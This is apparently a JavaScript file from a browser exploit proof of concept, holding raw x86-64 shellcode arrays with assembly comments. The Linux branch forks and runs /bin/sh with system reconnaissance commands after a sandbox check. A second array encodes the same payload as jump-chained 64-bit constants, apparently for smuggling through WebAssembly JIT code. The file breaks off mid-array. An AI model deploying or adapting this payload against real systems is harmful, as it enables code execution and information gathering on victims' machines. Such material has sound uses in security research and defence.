// PASTE RESEARCHER'S shellcode.js CONTENT BELOW THIS LINE

let shellcode = [
    // ZF set if not a Windows system
    0x41, 0x8c, 0xec,                        // 00: MOV r12d, gs
    0x4d, 0x85, 0xe4,                        // 03: TEST r12, r12
    0x0f, 0x84, 0x3b, 0x00, 0x00, 0x00,      // 06: JZ :Label('Linux') => 0x0047
    // Windows shellcode
    0x49, 0x89, 0xc4,                        // 12: MOV r12, rax
    0x48, 0x31, 0xc9,                        // 15: XOR rcx, rcx
    0x65, 0x48, 0x8b, 0x41, 0x60,            // 18: MOV(rax, gs:[rcx+0x60])
    0x48, 0x8b, 0x40, 0x20,                  // 23: MOV rax, [rax + 32]
    0x66, 0x8b, 0x48, 0x70,                  // 27: MOV cx, [rax + 112]
    0x48, 0x8b, 0x40, 0x78,                  // 31: MOV rax, [rax + 120]
    // loop [0x0023]:
    0x44, 0x8a, 0x18,                        // 35: MOV r11b, [rax]
    0x45, 0x88, 0x1c, 0x24,                  // 38: MOV [r12], r11b
    0x48, 0xff, 0xc0,                        // 42: INC rax
    0x49, 0xff, 0xc4,                        // 45: INC r12
    0x48, 0xff, 0xc9,                        // 48: DEC rcx
    0x48, 0x85, 0xc9,                        // 51: TEST rcx, rcx
    0x0f, 0x85, 0xe7, 0xff, 0xff, 0xff,      // 54: JNZ :Label('loop') => 0x0023
    0x68, 0x00, 0x01, 0x00, 0x00,            // 60: PUSH 256
    0x58,                                    // 65: POP rax
    0xe9, 0xf3, 0x02, 0x00, 0x00,            // 66: JMP :Label('return') => 0x033a
    // Linux [0x0047]:
    0x49, 0x89, 0xc4,                        // 71: MOV r12, rax
    0x68, 0x2f, 0x00, 0x00, 0x2f,            // 74: PUSH 788529199
    0x31, 0xd2,                              // 79: XOR edx, edx
    0x31, 0xf6,                              // 81: XOR esi, esi
    0x48, 0x89, 0xe7,                        // 83: MOV rdi, rsp
    0xb8, 0x02, 0x00, 0x00, 0x00,            // 86: MOV eax, 2
    0x0f, 0x05,                              // 91: SYSCALL
    0x5f,                                    // 93: POP rdi
    0x48, 0xc1, 0xe8, 0x3f,                  // 94: SHR rax, 63
    0x85, 0xc0,                              // 98: TEST eax, eax
    0x4c, 0x89, 0xe0,                        // 100: MOV rax, r12
    0x0f, 0x85, 0x60, 0x02, 0x00, 0x00,      // 103: JNZ :Label('LinuxSandbox') => 0x02cd
    // LinuxForkExec [0x006d]:
    0x48, 0x89, 0xc3,                        // 109: MOV rbx, rax
    // pipe(link)
    0x6a, 0x00,                              // 112: PUSH 0
    0xb8, 0x16, 0x00, 0x00, 0x00,            // 114: MOV eax, 22
    0x48, 0x89, 0xe7,                        // 119: MOV rdi, rsp
    0x0f, 0x05,                              // 122: SYSCALL
    0x41, 0x59,                              // 124: POP r9
    0x45, 0x89, 0xc8,                        // 126: MOV r8d, r9d
    0x49, 0xc1, 0xe9, 0x20,                  // 129: SHR r9, 32
    0xb8, 0x39, 0x00, 0x00, 0x00,            // 133: MOV eax, 57
    0x0f, 0x05,                              // 138: SYSCALL
    0x48, 0x85, 0xc0,                        // 140: TEST rax, rax
    0x0f, 0x85, 0xfb, 0x01, 0x00, 0x00,      // 143: JNZ :Label('parent') => 0x0290
    // Fork Child
    // dup2(link[1], STDOUT_FILENO);
    0xb8, 0x21, 0x00, 0x00, 0x00,            // 149: MOV eax, 33
    0x4c, 0x89, 0xcf,                        // 154: MOV rdi, r9
    0xbe, 0x01, 0x00, 0x00, 0x00,            // 157: MOV esi, 1
    0x0f, 0x05,                              // 162: SYSCALL
    // close(link[0])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 164: MOV eax, 3
    0x4c, 0x89, 0xc7,                        // 169: MOV rdi, r8
    0x0f, 0x05,                              // 172: SYSCALL
    // close(link[1])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 174: MOV eax, 3
    0x4c, 0x89, 0xcf,                        // 179: MOV rdi, r9
    0x0f, 0x05,                              // 182: SYSCALL
    0x31, 0xc0,                              // 184: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 186: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 190: OR rax, 0
    0x50,                                    // 194: PUSH rax
    0x31, 0xc0,                              // 195: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 197: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 201: OR rax, 0
    0x50,                                    // 205: PUSH rax
    0xb8, 0x2f, 0x2f, 0x73, 0x68,            // 206: MOV eax, 1752379183
    0x48, 0xc1, 0xe0, 0x20,                  // 211: SHL rax, 32
    0x48, 0x0d, 0x2f, 0x62, 0x69, 0x6e,      // 215: OR rax, 1852400175
    0x50,                                    // 221: PUSH rax
    0x54,                                    // 222: PUSH rsp
    0x41, 0x58,                              // 223: POP r8
    0x31, 0xc0,                              // 225: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 227: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 231: OR rax, 0
    0x50,                                    // 235: PUSH rax
    0x31, 0xc0,                              // 236: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 238: SHL rax, 32
    0x48, 0x0d, 0x2d, 0x63, 0x00, 0x00,      // 242: OR rax, 25389
    0x50,                                    // 248: PUSH rax
    0x54,                                    // 249: PUSH rsp
    0x41, 0x59,                              // 250: POP r9
    0x31, 0xc0,                              // 252: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 254: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 258: OR rax, 0
    0x50,                                    // 262: PUSH rax
    0x31, 0xc0,                              // 263: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 265: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 269: OR rax, 0
    0x50,                                    // 273: PUSH rax
    0xb8, 0x20, 0x2d, 0x31, 0x3b,            // 274: MOV eax, 993078560
    0x48, 0xc1, 0xe0, 0x20,                  // 279: SHL rax, 32
    0x48, 0x0d, 0x68, 0x65, 0x61, 0x64,      // 283: OR rax, 1684104552
    0x50,                                    // 289: PUSH rax
    0xb8, 0x50, 0x20, 0x7c, 0x20,            // 290: MOV eax, 545005648
    0x48, 0xc1, 0xe0, 0x20,                  // 295: SHL rax, 32
    0x48, 0x0d, 0x2b, 0x27, 0x20, 0x24,      // 299: OR rax, 606086955
    0x50,                                    // 305: PUSH rax
    0xb8, 0x30, 0x2d, 0x39, 0x5d,            // 306: MOV eax, 1564028208
    0x48, 0xc1, 0xe0, 0x20,                  // 311: SHL rax, 32
    0x48, 0x0d, 0x7d, 0x5c, 0x2e, 0x5b,      // 315: OR rax, 1529764989
    0x50,                                    // 321: PUSH rax
    0xb8, 0x39, 0x5d, 0x7b, 0x34,            // 322: MOV eax, 880500025
    0x48, 0xc1, 0xe0, 0x20,                  // 327: SHL rax, 32
    0x48, 0x0d, 0x2e, 0x5b, 0x30, 0x2d,      // 331: OR rax, 758143790
    0x50,                                    // 337: PUSH rax
    0xb8, 0x5c, 0x2e, 0x30, 0x5c,            // 338: MOV eax, 1546661468
    0x48, 0xc1, 0xe0, 0x20,                  // 343: SHL rax, 32
    0x48, 0x0d, 0x5d, 0x7b, 0x33, 0x7d,      // 347: OR rax, 2100525917
    0x50,                                    // 353: PUSH rax
    0xb8, 0x5b, 0x30, 0x2d, 0x39,            // 354: MOV eax, 959262811
    0x48, 0xc1, 0xe0, 0x20,                  // 359: SHL rax, 32
    0x48, 0x0d, 0x45, 0x6f, 0x20, 0x27,      // 363: OR rax, 656437061
    0x50,                                    // 369: PUSH rax
    0xb8, 0x70, 0x20, 0x2d, 0x61,            // 370: MOV eax, 1630347376
    0x48, 0xc1, 0xe0, 0x20,                  // 375: SHL rax, 32
    0x48, 0x0d, 0x20, 0x67, 0x72, 0x65,      // 379: OR rax, 1701996320
    0x50,                                    // 385: PUSH rax
    0xb8, 0x20, 0x24, 0x50, 0x3b,            // 386: MOV eax, 995107872
    0x48, 0xc1, 0xe0, 0x20,                  // 391: SHL rax, 32
    0x48, 0x0d, 0x20, 0x2d, 0x6c, 0x61,      // 395: OR rax, 1634479392
    0x50,                                    // 401: PUSH rax
    0xb8, 0x3b, 0x20, 0x6c, 0x73,            // 402: MOV eax, 1936465979
    0x48, 0xc1, 0xe0, 0x20,                  // 407: SHL rax, 32
    0x48, 0x0d, 0x2f, 0x65, 0x78, 0x65,      // 411: OR rax, 1702389039
    0x50,                                    // 417: PUSH rax
    0xb8, 0x50, 0x50, 0x49, 0x44,            // 418: MOV eax, 1145655376
    0x48, 0xc1, 0xe0, 0x20,                  // 423: SHL rax, 32
    0x48, 0x0d, 0x6f, 0x63, 0x2f, 0x24,      // 427: OR rax, 607085423
    0x50,                                    // 433: PUSH rax
    0xb8, 0x3d, 0x2f, 0x70, 0x72,            // 434: MOV eax, 1919954749
    0x48, 0xc1, 0xe0, 0x20,                  // 439: SHL rax, 32
    0x48, 0x0d, 0x72, 0x74, 0x20, 0x50,      // 443: OR rax, 1344304242
    0x50,                                    // 449: PUSH rax
    0xb8, 0x65, 0x78, 0x70, 0x6f,            // 450: MOV eax, 1869641829
    0x48, 0xc1, 0xe0, 0x20,                  // 455: SHL rax, 32
    0x48, 0x0d, 0x68, 0x6f, 0x3b, 0x20,      // 459: OR rax, 540766056
    0x50,                                    // 465: PUSH rax
    0xb8, 0x3b, 0x20, 0x65, 0x63,            // 466: MOV eax, 1667571771
    0x48, 0xc1, 0xe0, 0x20,                  // 471: SHL rax, 32
    0x48, 0x0d, 0x6c, 0x69, 0x6e, 0x65,      // 475: OR rax, 1701734764
    0x50,                                    // 481: PUSH rax
    0xb8, 0x2f, 0x63, 0x6d, 0x64,            // 482: MOV eax, 1684890415
    0x48, 0xc1, 0xe0, 0x20,                  // 487: SHL rax, 32
    0x48, 0x0d, 0x50, 0x50, 0x49, 0x44,      // 491: OR rax, 1145655376
    0x50,                                    // 497: PUSH rax
    0xb8, 0x6f, 0x63, 0x2f, 0x24,            // 498: MOV eax, 607085423
    0x48, 0xc1, 0xe0, 0x20,                  // 503: SHL rax, 32
    0x48, 0x0d, 0x20, 0x2f, 0x70, 0x72,      // 507: OR rax, 1919954720
    0x50,                                    // 513: PUSH rax
    0xb8, 0x20, 0x63, 0x61, 0x74,            // 514: MOV eax, 1952539424
    0x48, 0xc1, 0xe0, 0x20,                  // 519: SHL rax, 32
    0x48, 0x0d, 0x69, 0x6d, 0x65, 0x3b,      // 523: OR rax, 996502889
    0x50,                                    // 529: PUSH rax
    0xb8, 0x2f, 0x75, 0x70, 0x74,            // 530: MOV eax, 1953527087
    0x48, 0xc1, 0xe0, 0x20,                  // 535: SHL rax, 32
    0x48, 0x0d, 0x70, 0x72, 0x6f, 0x63,      // 539: OR rax, 1668248176
    0x50,                                    // 545: PUSH rax
    0xb8, 0x61, 0x74, 0x20, 0x2f,            // 546: MOV eax, 790656097
    0x48, 0xc1, 0xe0, 0x20,                  // 551: SHL rax, 32
    0x48, 0x0d, 0x65, 0x3b, 0x20, 0x63,      // 555: OR rax, 1663056741
    0x50,                                    // 561: PUSH rax
    0xb8, 0x20, 0x64, 0x61, 0x74,            // 562: MOV eax, 1952539680
    0x48, 0xc1, 0xe0, 0x20,                  // 567: SHL rax, 32
    0x48, 0x0d, 0x20, 0x2d, 0x61, 0x3b,      // 571: OR rax, 996224288
    0x50,                                    // 577: PUSH rax
    0xb8, 0x6e, 0x61, 0x6d, 0x65,            // 578: MOV eax, 1701667182
    0x48, 0xc1, 0xe0, 0x20,                  // 583: SHL rax, 32
    0x48, 0x0d, 0x64, 0x3b, 0x20, 0x75,      // 587: OR rax, 1965046628
    0x50,                                    // 593: PUSH rax
    0xb8, 0x3b, 0x20, 0x70, 0x77,            // 594: MOV eax, 2003836987
    0x48, 0xc1, 0xe0, 0x20,                  // 599: SHL rax, 32
    0x48, 0x0d, 0x6e, 0x61, 0x6d, 0x65,      // 603: OR rax, 1701667182
    0x50,                                    // 609: PUSH rax
    0xb8, 0x68, 0x6f, 0x73, 0x74,            // 610: MOV eax, 1953722216
    0x48, 0xc1, 0xe0, 0x20,                  // 615: SHL rax, 32
    0x48, 0x0d, 0x69, 0x64, 0x3b, 0x20,      // 619: OR rax, 540763241
    0x50,                                    // 625: PUSH rax
    0x54,                                    // 626: PUSH rsp
    0x41, 0x5a,                              // 627: POP r10
    0x6a, 0x00,                              // 629: PUSH 0
    0x41, 0x52,                              // 631: PUSH r10
    0x41, 0x51,                              // 633: PUSH r9
    0x41, 0x50,                              // 635: PUSH r8
    0x54,                                    // 637: PUSH rsp
    0x41, 0x5a,                              // 638: POP r10
    0xb8, 0x3b, 0x00, 0x00, 0x00,            // 640: MOV eax, 59
    0x4c, 0x89, 0xd6,                        // 645: MOV rsi, r10
    0x48, 0x8b, 0x3e,                        // 648: MOV rdi, [rsi]
    0x48, 0x31, 0xd2,                        // 651: XOR rdx, rdx
    0x0f, 0x05,                              // 654: SYSCALL
    // parent [0x0290]:
    // Fork Parent
    // close(link[1])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 656: MOV eax, 3
    0x4c, 0x89, 0xcf,                        // 661: MOV rdi, r9
    0x0f, 0x05,                              // 664: SYSCALL
    0xba, 0x00, 0x10, 0x00, 0x00,            // 666: MOV edx, 4096
    // read [0x029f]:
    // read(link[0], rbx, 4096)
    0x48, 0x31, 0xc0,                        // 671: XOR rax, rax
    0x4c, 0x89, 0xc7,                        // 674: MOV rdi, r8
    0x48, 0x89, 0xde,                        // 677: MOV rsi, rbx
    0x0f, 0x05,                              // 680: SYSCALL
    0x48, 0x01, 0xc3,                        // 682: ADD rbx, rax
    0x29, 0xc2,                              // 685: SUB edx, eax
    0x48, 0x85, 0xc0,                        // 687: TEST rax, rax
    0x0f, 0x85, 0xe7, 0xff, 0xff, 0xff,      // 690: JNZ :Label('read') => 0x029f
    // close(link[0])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 696: MOV eax, 3
    0x4c, 0x89, 0xc7,                        // 701: MOV rdi, r8
    0x0f, 0x05,                              // 704: SYSCALL
    0x68, 0x80, 0x00, 0x00, 0x00,            // 706: PUSH 128
    0x58,                                    // 711: POP rax
    0xe9, 0x6d, 0x00, 0x00, 0x00,            // 712: JMP :Label('return') => 0x033a
    // LinuxSandbox [0x02cd]:
    0x48, 0x89, 0xc7,                        // 717: MOV rdi, rax
    0xb8, 0x66, 0x00, 0x00, 0x00,            // 720: MOV eax, 102
    0x0f, 0x05,                              // 725: SYSCALL
    0x48, 0x89, 0xfb,                        // 727: MOV rbx, rdi
    0xb9, 0x0a, 0x00, 0x00, 0x00,            // 730: MOV ecx, 10
    // convert_loop [0x02df]:
    0x31, 0xd2,                              // 735: XOR edx, edx
    0xf7, 0xf1,                              // 737: DIV ecx
    0x83, 0xc2, 0x30,                        // 739: ADD edx, 48
    0x89, 0x13,                              // 742: MOV [rbx], edx
    0x48, 0xff, 0xc3,                        // 744: INC rbx
    0x85, 0xc0,                              // 747: TEST eax, eax
    0x0f, 0x85, 0xec, 0xff, 0xff, 0xff,      // 749: JNZ :Label('convert_loop') => 0x02df
    0x48, 0xff, 0xcb,                        // 755: DEC rbx
    0x48, 0x89, 0xda,                        // 758: MOV rdx, rbx
    0x48, 0x89, 0xf9,                        // 761: MOV rcx, rdi
    // reverse_loop [0x02fc]:
    0x8a, 0x07,                              // 764: MOV al, [rdi]
    0x8a, 0x1a,                              // 766: MOV bl, [rdx]
    0x88, 0x1f,                              // 768: MOV [rdi], bl
    0x88, 0x02,                              // 770: MOV [rdx], al
    0x48, 0xff, 0xc7,                        // 772: INC rdi
    0x48, 0xff, 0xca,                        // 775: DEC rdx
    0x48, 0x39, 0xd7,                        // 778: CMP rdi, rdx
    0x0f, 0x8c, 0xe9, 0xff, 0xff, 0xff,      // 781: JMP :Label('reverse_loop') => 0x02fc
    0x48, 0x01, 0xd7,                        // 787: ADD rdi, rdx
    0x48, 0x29, 0xcf,                        // 790: SUB rdi, rcx
    0x48, 0xff, 0xc7,                        // 793: INC rdi
    0x31, 0xc9,                              // 796: XOR ecx, ecx
    0x89, 0x0f,                              // 798: MOV [rdi], ecx
    0x48, 0xff, 0xc7,                        // 800: INC rdi
    0xb8, 0x3f, 0x00, 0x00, 0x00,            // 803: MOV eax, 63
    0x0f, 0x05,                              // 808: SYSCALL
    0x31, 0xc0,                              // 810: XOR eax, eax
    0xb8, 0x80, 0x01, 0x00, 0x00,            // 812: MOV eax, 384
    0x48, 0x01, 0xc7,                        // 817: ADD rdi, rax
    0x48, 0x89, 0xf8,                        // 820: MOV rax, rdi
    0x6a, 0x40,                              // 823: PUSH 64
    0x58,                                    // 825: POP rax
    // return [0x033a]:
    0xc3,                                    // 826: RET
];

let wasmShellcode = [
    0x05eb909090909090n, // 0x0000: SLED 6
    // Setup rax to point to the iomem string data
    0x010207eb0cc08348n, // 0x000d: ADD rax, 12
    // ZF set if not a Windows system
    0x01010308ebec8c41n, // 0x001a: MOV r12d, gs
    0x01010408ebe4854dn, // 0x0027: TEST r12, r12
    0x05eb000000d7840fn, // 0x0034: JZ :Label('Linux') => 0x0111
    // Windows shellcode
    0x01010608ebc48949n, // 0x0041: MOV r12, rax
    0x01010708ebc93148n, // 0x004e: XOR rcx, rcx
    0x0806eb60418b4865n, // 0x005b: MOV(rax, gs:[rcx+0x60])
    0x010907eb20408b48n, // 0x0068: MOV rax, [rax + 32]
    0x010a07eb70488b66n, // 0x0075: MOV cx, [rax + 112]
    0x010b07eb78408b48n, // 0x0082: MOV rax, [rax + 120]
    // loop [0x008f]:
    0x01010c08eb188a44n, // 0x008f: MOV r11b, [rax]
    0x010d07eb241c8845n, // 0x009c: MOV [r12], r11b
    0x01010e08ebc0ff48n, // 0x00a9: INC rax
    0x01010f08ebc4ff49n, // 0x00b6: INC r12
    0x01011008ebc9ff48n, // 0x00c3: DEC rcx
    0x01011108ebc98548n, // 0x00d0: TEST rcx, rcx
    0x05ebffffffac850fn, // 0x00dd: JNZ :Label('loop') => 0x008f
    0x1306eb0000010068n, // 0x00ea: PUSH 256
    0x01010101140aeb58n, // 0x00f7: POP rax
    0x1506eb00000b82e9n, // 0x0104: JMP :Label('return') => 0x0c8b
    // Linux [0x0111]:
    0x01011608ebc48949n, // 0x0111: MOV r12, rax
    0x1706eb2f00002f68n, // 0x011e: PUSH 788529199
    0x0101011809ebd231n, // 0x012b: XOR edx, edx
    0x0101011909ebf631n, // 0x0138: XOR esi, esi
    0x01011a08ebe78948n, // 0x0145: MOV rdi, rsp
    0x1b06eb00000002b8n, // 0x0152: MOV eax, 2
    0x0101011c09eb050fn, // 0x015f: SYSCALL
    0x010101011d0aeb5fn, // 0x016c: POP rdi
    0x011e07eb3fe8c148n, // 0x0179: SHR rax, 63
    0x0101011f09ebc085n, // 0x0186: TEST eax, eax
    0x01012008ebe0894cn, // 0x0193: MOV rax, r12
    0x05eb000008d0850fn, // 0x01a0: JNZ :Label('LinuxSandbox') => 0x0a76
    // LinuxForkExec [0x01ad]:
    0x01012208ebc38948n, // 0x01ad: MOV rbx, rax
    // pipe(link)
    0x0101012309eb006an, // 0x01ba: PUSH 0
    0x2406eb00000016b8n, // 0x01c7: MOV eax, 22
    0x01012508ebe78948n, // 0x01d4: MOV rdi, rsp
    0x0101012609eb050fn, // 0x01e1: SYSCALL
    0x0101012709eb5941n, // 0x01ee: POP r9
    0x01012808ebc88945n, // 0x01fb: MOV r8d, r9d
    0x012907eb20e9c149n, // 0x0208: SHR r9, 32
    0x2a06eb00000039b8n, // 0x0215: MOV eax, 57
    0x0101012b09eb050fn, // 0x0222: SYSCALL
    0x01012c08ebc08548n, // 0x022f: TEST rax, rax
    0x05eb0000074a850fn, // 0x023c: JNZ :Label('parent') => 0x098c
    // Fork Child
    // dup2(link[1], STDOUT_FILENO);
    0x2e06eb00000021b8n, // 0x0249: MOV eax, 33
    0x01012f08ebcf894cn, // 0x0256: MOV rdi, r9
    0x3006eb00000001ben, // 0x0263: MOV esi, 1
    0x0101013109eb050fn, // 0x0270: SYSCALL
    // close(link[0])
    0x3206eb00000003b8n, // 0x027d: MOV eax, 3
    0x01013308ebc7894cn, // 0x028a: MOV rdi, r8
    0x0101013409eb050fn, // 0x0297: SYSCALL
    // close(link[1])
    0x3506eb00000003b8n, // 0x02a4: MOV eax, 3
    0x01013608ebcf894cn, // 0x02b1: MOV rdi, r9
    0x0101013709eb050fn, // 0x02be: SYSCALL
    0x0101013809ebc031n, // 0x02cb: XOR eax, eax
    0x013907eb20e0c148n, // 0x02d8: SHL rax, 32
    0x013a07eb00c88348n, // 0x02e5: OR rax, 0
    0x010101013b0aeb50n, // 0x02f2: PUSH rax
    0x0101013c09ebc031n, // 0x02ff: XOR eax, eax
    0x013d07eb20e0c148n, // 0x030c: SHL rax, 32
    0x013e07eb00c88348n, // 0x0319: OR rax, 0
    0x010101013f0aeb50n, // 0x0326: PUSH rax
    0x4006eb68732f2fb8n, // 0x0333: MOV eax, 1752379183
    0x014107eb20e0c148n, // 0x0340: SHL rax, 32
    0x05eb6e69622f0d48n, // 0x034d: OR rax, 1852400175
    0x01010101430aeb50n, // 0x035a: PUSH rax
    0x01010101440aeb54n, // 0x0367: PUSH rsp
    0x0101014509eb5841n, // 0x0374: POP r8
    0x0101014609ebc031n, // 0x0381: XOR eax, eax
    0x014707eb20e0c148n, // 0x038e: SHL rax, 32
    0x014807eb00c88348n, // 0x039b: OR rax, 0
    0x01010101490aeb50n, // 0x03a8: PUSH rax
    0x0101014a09ebc031n, // 0x03b5: XOR eax, eax
    0x014b07eb20e0c148n, // 0x03c2: SHL rax, 32
    0x05eb0000632d0d48n, // 0x03cf: OR rax, 25389
    0x010101014d0aeb50n, // 0x03dc: PUSH rax
    0x010101014e0aeb54n, // 0x03e9: PUSH rsp
    0x0101014f09eb5941n, // 0x03f6: POP r9
    0x0101015009ebc031n, // 0x0403: XOR eax, eax
    0x015107eb20e0c148n, // 0x0410: SHL rax, 32
    0x015207eb00c88348n, // 0x041d: OR rax, 0
    0x01010101530aeb50n, // 0x042a: PUSH rax
    0x0101015409ebc031n, // 0x0437: XOR eax, eax
    0x015507eb20e0c148n, // 0x0444: SHL rax, 32
    0x015607eb3bc88348n, // 0x0451: OR rax, 59
    0x01010101570aeb50n, // 0x045e: PUSH rax
    0x5806eb312d2064b8n, // 0x046b: MOV eax, 825040996
    0x015907eb20e0c148n, // 0x0478: SHL rax, 32
    0x05eb616568200d48n, // 0x0485: OR rax, 1634035744
    0x010101015b0aeb50n, // 0x0492: PUSH rax
    0x5c06eb7c205024b8n, // 0x049f: MOV eax, 2082492452
    0x015d07eb20e0c148n, // 0x04ac: SHL rax, 32
    0x05eb20272b5d0d48n, // 0x04b9: OR rax, 539437917
    0x010101015f0aeb50n, // 0x04c6: PUSH rax
    0x6006eb392d305bb8n, // 0x04d3: MOV eax, 959262811
    0x016107eb20e0c148n, // 0x04e0: SHL rax, 32
    0x05eb2e5c7d340d48n, // 0x04ed: OR rax, 777813300
    0x01010101630aeb50n, // 0x04fa: PUSH rax
    0x6406eb7b5d392db8n, // 0x0507: MOV eax, 2069707053
    0x016507eb20e0c148n, // 0x0514: SHL rax, 32
    0x05eb305b2e5c0d48n, // 0x0521: OR rax, 811282012
    0x01010101670aeb50n, // 0x052e: PUSH rax
    0x6806eb302e5c7db8n, // 0x053b: MOV eax, 808344701
    0x016907eb20e0c148n, // 0x0548: SHL rax, 32
    0x05eb337b5d390d48n, // 0x0555: OR rax, 863722809
    0x010101016b0aeb50n, // 0x0562: PUSH rax
    0x6c06eb2d305b27b8n, // 0x056f: MOV eax, 758143783
    0x016d07eb20e0c148n, // 0x057c: SHL rax, 32
    0x05eb206f45610d48n, // 0x0589: OR rax, 544163169
    0x010101016f0aeb50n, // 0x0596: PUSH rax
    0x7006eb2d207065b8n, // 0x05a3: MOV eax, 757100645
    0x017107eb20e0c148n, // 0x05b0: SHL rax, 32
    0x05eb726720200d48n, // 0x05bd: OR rax, 1919361056
    0x01010101730aeb50n, // 0x05ca: PUSH rax
    0x7406eb3b502420b8n, // 0x05d7: MOV eax, 995107872
    0x017507eb20e0c148n, // 0x05e4: SHL rax, 32
    0x05eb616c2d200d48n, // 0x05f1: OR rax, 1634479392
    0x01010101770aeb50n, // 0x05fe: PUSH rax
    0x7806eb736c203bb8n, // 0x060b: MOV eax, 1936465979
    0x017907eb20e0c148n, // 0x0618: SHL rax, 32
    0x05eb6578652f0d48n, // 0x0625: OR rax, 1702389039
    0x010101017b0aeb50n, // 0x0632: PUSH rax
    0x7c06eb44495050b8n, // 0x063f: MOV eax, 1145655376
    0x017d07eb20e0c148n, // 0x064c: SHL rax, 32
    0x05eb242f636f0d48n, // 0x0659: OR rax, 607085423
    0x010101017f0aeb50n, // 0x0666: PUSH rax
    0x8006eb72702f3db8n, // 0x0673: MOV eax, 1919954749
    0x018107eb20e0c148n, // 0x0680: SHL rax, 32
    0x05eb502074720d48n, // 0x068d: OR rax, 1344304242
    0x01010101830aeb50n, // 0x069a: PUSH rax
    0x8406eb6f707865b8n, // 0x06a7: MOV eax, 1869641829
    0x018507eb20e0c148n, // 0x06b4: SHL rax, 32
    0x05eb203b6f680d48n, // 0x06c1: OR rax, 540766056
    0x01010101870aeb50n, // 0x06ce: PUSH rax
    0x8806eb6365203bb8n, // 0x06db: MOV eax, 1667571771
    0x018907eb20e0c148n, // 0x06e8: SHL rax, 32
    0x05eb656e696c0d48n, // 0x06f5: OR rax, 1701734764
    0x010101018b0aeb50n, // 0x0702: PUSH rax
    0x8c06eb646d632fb8n, // 0x070f: MOV eax, 1684890415
    0x018d07eb20e0c148n, // 0x071c: SHL rax, 32
    0x05eb444950500d48n, // 0x0729: OR rax, 1145655376
    0x010101018f0aeb50n, // 0x0736: PUSH rax
    0x9006eb242f636fb8n, // 0x0743: MOV eax, 607085423
    0x019107eb20e0c148n, // 0x0750: SHL rax, 32
    0x05eb72702f200d48n, // 0x075d: OR rax, 1919954720
    0x01010101930aeb50n, // 0x076a: PUSH rax
    0x9406eb74616320b8n, // 0x0777: MOV eax, 1952539424
    0x019507eb20e0c148n, // 0x0784: SHL rax, 32
    0x05eb3b656d690d48n, // 0x0791: OR rax, 996502889
    0x01010101970aeb50n, // 0x079e: PUSH rax
    0x9806eb7470752fb8n, // 0x07ab: MOV eax, 1953527087
    0x019907eb20e0c148n, // 0x07b8: SHL rax, 32
    0x05eb636f72700d48n, // 0x07c5: OR rax, 1668248176
    0x010101019b0aeb50n, // 0x07d2: PUSH rax
    0x9c06eb2f207461b8n, // 0x07df: MOV eax, 790656097
    0x019d07eb20e0c148n, // 0x07ec: SHL rax, 32
    0x05eb63203b650d48n, // 0x07f9: OR rax, 1663056741
    0x010101019f0aeb50n, // 0x0806: PUSH rax
    0xa006eb74616420b8n, // 0x0813: MOV eax, 1952539680
    0x01a107eb20e0c148n, // 0x0820: SHL rax, 32
    0x05eb3b612d200d48n, // 0x082d: OR rax, 996224288
    0x01010101a30aeb50n, // 0x083a: PUSH rax
    0xa406eb656d616eb8n, // 0x0847: MOV eax, 1701667182
    0x01a507eb20e0c148n, // 0x0854: SHL rax, 32
    0x05eb75203b640d48n, // 0x0861: OR rax, 1965046628
    0x01010101a70aeb50n, // 0x086e: PUSH rax
    0xa806eb7770203bb8n, // 0x087b: MOV eax, 2003836987
    0x01a907eb20e0c148n, // 0x0888: SHL rax, 32
    0x05eb656d616e0d48n, // 0x0895: OR rax, 1701667182
    0x01010101ab0aeb50n, // 0x08a2: PUSH rax
    0xac06eb74736f68b8n, // 0x08af: MOV eax, 1953722216
    0x01ad07eb20e0c148n, // 0x08bc: SHL rax, 32
    0x05eb203b64690d48n, // 0x08c9: OR rax, 540763241
    0x01010101af0aeb50n, // 0x08d6: PUSH rax
    0x01010101b00aeb54n, // 0x08e3: PUSH rsp
    0x010101b109eb5a41n, // 0x08f0: POP r10
    0x010101b209eb006an, // 0x08fd: PUSH 0
    0x010101b309eb5241n, // 0x090a: PUSH r10
    0x010101b409eb5141n, // 0x0917: PUSH r9
    0x010101b509eb5041n, // 0x0924: PUSH r8
    0x01010101b60aeb54n, // 0x0931: PUSH rsp
    0x010101b709eb5a41n, // 0x093e: POP r10
    0xb806eb0000003bb8n, // 0x094b: MOV eax, 59
    0x0101b908ebd6894cn, // 0x0958: MOV rsi, r10
    0x0101ba08eb3e8b48n, // 0x0965: MOV rdi, [rsi]
    0x0101bb08ebd23148n, // 0x0972: XOR rdx, rdx
    0x010101bc09eb050fn, // 0x097f: SYSCALL
    // parent [0x098c]:
    // Fork Parent
    // close(link[1])
    0xbd06eb00000003b8n, // 0x098c: MOV eax, 3
    0x0101be08ebcf894cn, // 0x0999: MOV rdi, r9
    0x010101bf09eb050fn, // 0x09a6: SYSCALL
    0xc006eb00001000ban, // 0x09b3: MOV edx, 4096
    // read [0x09c0]:
    // read(link[0], rbx, 4096)
    0x0101c108ebc03148n, // 0x09c0: XOR rax, rax
    0x0101c208ebc7894cn, // 0x09cd: MOV rdi, r8
    0x0101c308ebde8948n, // 0x09da: MOV rsi, rbx
    0x010101c409eb050fn, // 0x09e7: SYSCALL
    0x0101c508ebc30148n, // 0x09f4: ADD rbx, rax
    0x010101c609ebc229n, // 0x0a01: SUB edx, eax
    0x0101c708ebc08548n, // 0x0a0e: TEST rax, rax
    0x05ebffffff9f850fn, // 0x0a1b: JNZ :Label('read') => 0x09c0
    // close(link[0])
    0xc906eb00000003b8n, // 0x0a28: MOV eax, 3
    0x0101ca08ebc7894cn, // 0x0a35: MOV rdi, r8
    0x010101cb09eb050fn, // 0x0a42: SYSCALL
    0xcc06eb0000008068n, // 0x0a4f: PUSH 128
